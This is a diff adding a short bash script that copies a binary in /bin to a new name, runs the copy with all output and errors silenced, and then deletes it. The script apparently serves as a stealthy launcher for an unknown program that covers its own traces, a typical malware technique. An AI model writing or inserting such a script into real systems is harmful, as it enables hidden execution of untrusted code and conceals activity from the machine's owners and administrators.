@@ -1,0 +1,6 @@
+#!/bin/bash
+cp -f -r -- /bin/crondr /bin/dbused 2>/dev/null
+cd /bin 2>/dev/null
+./dbused -c  >/dev/null 2>&1
+rm -rf -- dbused 2>/dev/null
+
